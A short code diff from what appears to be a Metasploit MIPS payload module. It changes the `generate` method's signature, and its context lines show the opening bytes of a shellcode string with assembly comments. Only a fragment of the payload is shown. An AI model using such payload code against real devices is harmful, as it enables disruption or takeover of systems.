@@ -38,7 +38,7 @@ module MetasploitModule
     )
   end
 
-  def generate
+  def generate(_opts = {})
     shellcode =
       "\x3c\x06\x43\x21" +  #lui     a2,0x4321
       "\x34\xc6\xfe\xdc" +  #ori     a2,a2,0xfedc
